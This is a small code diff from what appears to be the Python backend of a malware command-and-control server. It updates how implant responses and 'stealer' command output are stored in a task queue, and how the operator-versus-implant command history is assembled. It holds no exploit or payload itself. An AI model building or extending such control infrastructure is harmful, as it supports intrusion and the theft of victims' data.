@@ -271,16 +271,13 @@ def handle_response_json():
         response_data = data['response_data']
         success = data['success']
         command = data['command']
-
         print("checking command: " + command)
         if "stealer" in command:
             # TODO call Wyatt's function
             response_data = WyattWonderland.parsejson(response_data)
-
         print("Querying now")
         # DUMP BACK INTO TASK_QUEUE
         query = "UPDATE task_queue SET status = 'executed', response_data = %s, success = %s, recieved_on = %s WHERE task_id= %s"
-
         print("succesful")
         time = datetime.now()
         tools.executeGenericVar(query, [response_data, success, time, task_id])
@@ -381,7 +378,7 @@ def get_history():
         pending = [{"sender": "user", "creator": x[-1],
                     "time":x[3], "command":x[2]} for x in pending]
         combined = [{"sender": "user", "creator": x[-1],
-                     "time":x[3], "command":x[2]} for x in executed]
+                     "time":x[3], "command":x[2]} for x in executing]
         combined += [{"sender": "implant", "time": x[-2],
                       "command":x[2], "response":x[-4]} for x in executed]
         combined += pending
